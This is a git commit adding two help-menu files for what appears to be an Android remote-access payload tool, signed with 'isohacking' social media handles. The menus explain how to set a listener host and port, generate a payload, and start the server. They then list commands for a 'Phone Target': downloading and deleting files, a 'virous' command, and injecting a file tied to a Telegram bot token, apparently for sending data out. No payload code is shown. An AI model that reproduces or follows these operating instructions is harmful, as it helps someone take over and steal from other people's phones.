0664c0cd439a40c40ffbbd2376017434f46c0d83
issamiso <101994309+issamiso@users.noreply.github.com>
2022-12-24 20:28:37 +0100

    Add files via upload

---
+++ Help/__Help__.py
@@ -0,0 +1,26 @@
+def Help():
+	print('''
+      --------------------------------
+      ¦             help             ¦
+      --------------------------------
+      ¦ set host # host you          ¦
+      ¦ set port # port you          ¦
+      ¦ set name # path payload      ¦
+      ¦ start or run                 ¦
+      ¦ # Creat payload              ¦
+      ¦ exploit # Start server       ¦
+      --------------------------------
+      ¦           #example           ¦
+      --------------------------------          
+      ¦ set host 100.67.212.145      ¦
+      ¦ set port 8081                ¦
+      ¦ set name /sdcard/payload.py  ¦
+      ¦ start                        ¦
+      ¦ exploit                      ¦
+      --------------------------------       
+--------------------------------------------  
+¦ # Please Report This bug To My Facebook  ¦ 
+¦ # https://www.facebook.com/isohacking    ¦
+¦ # Telegram : @i_4iS_exe                  ¦
+--------------------------------------------
+''')
---
+++ Help/__backhelp__.py
@@ -0,0 +1,27 @@
+def backhelp():
+	print=("""\33[0m
+   +-----------------------------------------+
+   ¦               command help              ¦
+   -------------------------------------------
+   ¦ cd /sdcard # open sdcard Phone Target   ¦
+   ¦ ls #                                    ¦
+   ¦ pwd # path in Phone Target              ¦ 
+   -------------------------------------------
+   ¦ download from Phone Target              ¦
+   ¦ mv and name files and path              ¦
+   -------------------------------------------
+   ¦ remove file in Phone Target             ¦
+   ¦ rm and name file                        ¦
+   -------------------------------------------
+   ¦ virous in Phone Target                  ¦
+   ¦ virous                                  ¦
+   -------------------------------------------
+   ¦ injected file in Phone Target           ¦
+   ¦ set host # Token Telegram               ¦  
+   ¦ set port # Id telegrma                  ¦
+   -------------------------------------------
+   ¦ # Please Report This bug To My Facebook ¦ 
+   ¦ # https://www.facebook.com/isohacking   ¦
+   ¦ # Telegram : @i_4iS_exe                 ¦
+   +-----------------------------------------+
+""")
